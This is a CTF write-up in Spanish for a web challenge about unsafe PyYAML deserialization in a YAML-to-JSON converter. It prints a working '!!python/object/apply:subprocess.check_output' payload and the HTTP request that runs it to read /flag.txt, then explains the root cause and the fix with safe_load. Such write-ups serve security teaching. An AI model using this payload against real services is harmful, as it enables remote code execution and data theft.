# Write-up — YAML Ain't Safe

| | |
|---|---|
| **CTF** | FluidAttacks CTF 2026 |
| **Categoría** | web |
| **Dificultad** | Easy |
| **Puntos** | 100 |
| **Flag** | `flag{866af9a7437755c2}` |
| **Vulnerabilidad** | Deserialización YAML insegura (`yaml.load` con `Loader=yaml.Loader`) → RCE |

---

## 1. Enunciado

> A developer built an online YAML-to-JSON converter and proudly open-sourced it.
> **The flag is /flag.txt.**

Adjunto: `public(1).zip` (AES, contraseña `infected`) con `app.py`.
Instancia: `https://9bb3d2802dd31a1c.chal.ctf.ae`.

---

## 2. Análisis del código

El endpoint que convierte YAML a JSON:

```python
@app.route("/convert", methods=["POST"])
def convert():
    data = request.get_json()
    yaml_input = data["yaml_input"]
    parsed = yaml.load(yaml_input, Loader=yaml.Loader)   # <-- INSEGURO
    json_output = json.dumps(parsed, indent=2, default=str)
    return jsonify({"result": json_output})
```

`yaml.load` con `Loader=yaml.Loader` (el **FullLoader/Loader completo**, no
`SafeLoader`) permite las etiquetas `!!python/object/...`, que instancian objetos y
**llaman funciones arbitrarias** de Python durante el parseo. Es RCE directo. El
resultado de la llamada se serializa de vuelta con `json.dumps(..., default=str)`, así
que lo que devuelva nuestra función aparece en la respuesta.

---

## 3. Explotación

Payload YAML que ejecuta `cat /flag.txt` y devuelve su salida:

```yaml
!!python/object/apply:subprocess.check_output [["cat","/flag.txt"]]
```

Petición:

```http
POST /convert
Content-Type: application/json

{"yaml_input": "!!python/object/apply:subprocess.check_output [[\"cat\",\"/flag.txt\"]]"}
```

`subprocess.check_output` devuelve `bytes`; como la app usa `default=str`, se serializa
el `repr` de esos bytes dentro de `result`:

```json
{"result":"\"b'flag{866af9a7437755c2}\\n'\""}
```

(Verificado primero en local leyendo `/etc/hostname` → `b'archlinux\n'`, confirmando el
RCE antes de tocar el remoto.)

---

## 4. Flag

```
flag{866af9a7437755c2}
```

---

## 5. Causa raíz y remediación

**Causa raíz:** usar `yaml.load` con un loader que soporta constructores de objetos
Python sobre entrada no confiable. Las etiquetas `!!python/object/apply` convierten un
"parser" en un intérprete de código.

**Cómo se arregla:**

- **Usar `yaml.safe_load`** (o `Loader=yaml.SafeLoader`), que solo produce tipos
  básicos (dict/list/str/int/…) y rechaza los constructores de objetos.
- Validar/limitar el tamaño y la estructura de la entrada.
- Ejecutar el servicio con **mínimos privilegios** y sin secretos accesibles como
  `/flag.txt` en el filesystem del proceso.

**Lección de CTF (web):** ante cualquier "conversor/parser" de YAML (Python), Pickle,
Marshal, o `ObjectInputStream` (Java), la primera prueba es un payload de
deserialización. En PyYAML, `yaml.load` sin `SafeLoader` = RCE con
`!!python/object/apply:<callable> [args]`.
